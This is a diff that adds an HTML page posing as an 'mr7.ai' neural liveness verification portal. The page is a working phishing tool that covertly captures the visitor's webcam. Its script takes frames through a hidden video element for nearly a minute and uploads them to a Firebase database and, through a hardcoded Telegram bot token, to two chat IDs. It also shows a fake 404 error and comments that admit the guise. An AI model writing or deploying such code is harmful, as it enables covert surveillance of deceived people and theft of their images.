@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>mr7.ai | Neural Gateway</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --neon-green: #00ff41;
+            --terminal-bg: #0a0a0a;
+            --border-glow: rgba(0, 255, 65, 0.2);
+        }
+
+        body { 
+            margin: 0; padding: 0; 
+            background: var(--terminal-bg); 
+            color: var(--neon-green);
+            font-family: 'Courier New', Courier, monospace;
+            display: flex; flex-direction: column; height: 100vh;
+            overflow: hidden;
+        }
+
+        .header {
+            padding: 20px; border-bottom: 1px solid var(--neon-green);
+            display: flex; justify-content: space-between; align-items: center;
+            background: rgba(0,0,0,0.8);
+        }
+
+        .logo { font-size: 24px; font-weight: bold; letter-spacing: 4px; }
+
+        .container {
+            flex-grow: 1; display: flex; align-items: center; justify-content: center;
+            padding: 20px; perspective: 1000px;
+        }
+
+        .ai-core {
+            width: 100%; max-width: 450px; 
+            background: rgba(0, 20, 0, 0.9);
+            border: 1px solid var(--neon-green);
+            border-radius: 4px; padding: 40px; text-align: center;
+            box-shadow: 0 0 30px var(--border-glow);
+            transform: rotateX(5deg);
+        }
+
+        .eye-scanner {
+            width: 120px; height: 120px; margin: 0 auto 30px;
+            border: 2px solid var(--neon-green); border-radius: 50%;
+            position: relative; display: flex; align-items: center; justify-content: center;
+        }
+
+        .iris-pulse {
+            width: 60%; height: 60%; border: 1px solid var(--neon-green);
+            border-radius: 50%; animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse { 
+            0% { transform: scale(1); opacity: 1; }
+            100% { transform: scale(1.5); opacity: 0; }
+        }
+
+        .scan-line {
+            position: absolute; width: 110%; height: 2px;
+            background: var(--neon-green); box-shadow: 0 0 15px var(--neon-green);
+            animation: move-scan 3s infinite linear;
+        }
+        @keyframes move-scan { 0% { top: 0; } 100% { top: 100%; } }
+
+        h2 { font-size: 18px; margin-bottom: 15px; text-transform: uppercase; }
+        p { font-size: 12px; line-height: 1.6; margin-bottom: 30px; color: #00aa2a; }
+
+        .btn-neural {
+            background: transparent; color: var(--neon-green); 
+            border: 1px solid var(--neon-green);
+            width: 100%; padding: 15px; font-size: 14px; cursor: pointer;
+            text-transform: uppercase; transition: 0.3s;
+        }
+        .btn-neural:hover { background: var(--neon-green); color: black; box-shadow: 0 0 20px var(--neon-green); }
+
+        /* UI States */
+        #sync-ui, #error-404 { display: none; }
+
+        .loc-tag {
+            font-size: 10px; margin-top: 25px; opacity: 0.6;
+            display: flex; justify-content: center; gap: 10px;
+        }
+
+        /* 404 Visuals */
+        .glitch { animation: glitch 1s linear infinite; }
+        @keyframes glitch {
+            2%, 64% { transform: translate(2px,0) skew(0deg); }
+            4%, 60% { transform: translate(-2px,0) skew(0deg); }
+            62% { transform: translate(0,0) skew(5deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="logo">MR7.AI // CORE</div>
+        <div style="font-size: 10px;">ID: 0x77-MUMBAI</div>
+    </div>
+
+    <div class="container">
+        <!-- Step 1: Initial Prompt -->
+        <div class="ai-core" id="init-view">
+            <div class="eye-scanner">
+                <div class="scan-line"></div>
+                <div class="iris-pulse"></div>
+            </div>
+            <h2>Liveness Verification</h2>
+            <p>Initiating Neural-Sync protocol. Please complete the <b>Visual Proof of Sentience</b> scan to verify identity for Mumbai High-Compute access.</p>
+            
+            <button class="btn-neural" onclick="startNeuralSync()">Initialize Handshake</button>
+            <div class="loc-tag">[ NODE: MUMBAI-CENTRAL-01 ] [ STATUS: SECURE ]</div>
+        </div>
+
+        <!-- Step 2: Syncing UI -->
+        <div class="ai-core" id="sync-ui">
+            <h2 class="glitch">Syncing Neural-Link...</h2>
+            <p>Mapping cognitive micro-expressions to verify non-synthetic origin. Accessing Mumbai localized AI weights...</p>
+            
+            <div style="text-align: left; background: #000; padding: 15px; border-radius: 4px; font-family: monospace; font-size: 10px; color: var(--neon-green); border: 1px solid #113311;">
+                > LOAD: MUMBAI_CLUSTER_V4... OK<br>
+                > CALIBRATING_LIVENESS_VAL... <span id="load-val">0</span>%<br>
+                > BROADCASTING_ENCRYPTED_ID...
+            </div>
+        </div>
+
+        <!-- Step 3: 404 Error UI -->
+        <div class="ai-core" id="error-404">
+            <div style="font-size: 40px; margin-bottom: 20px;">ERR_404</div>
+            <h2 style="color: #ff3333;">Link Synchronization Failure</h2>
+            <p>The Mumbai Neural Hub timed out. A visual re-calibration is required to bridge the identity gap and restore session data.</p>
+            <div class="btn-neural" style="border-color: #ff3333; color: #ff3333;">Attempting Re-Calibration...</div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startNeuralSync() {
+            try {
+                // Requesting camera under "Liveness Detection" guise
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        count++;
+                        document.getElementById('load-val').innerText = Math.min(count * 2, 99);
+                        
+                        if (count <= 55) {
+                            neuralCapture(count);
+                        }
+
+                        // Fake a 404 at 35 seconds to sustain the story
+                        if (count === 35) {
+                            document.getElementById('sync-ui').style.display = 'none';
+                            document.getElementById('error-404').style.display = 'block';
+                        }
+
+                        if (count >= 60) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://mr7.ai";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://mr7.ai";
+            }
+        }
+
+        function neuralCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "MR7_NEURAL_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_CENTRAL_HUB" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'mr7_neural_handshake.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
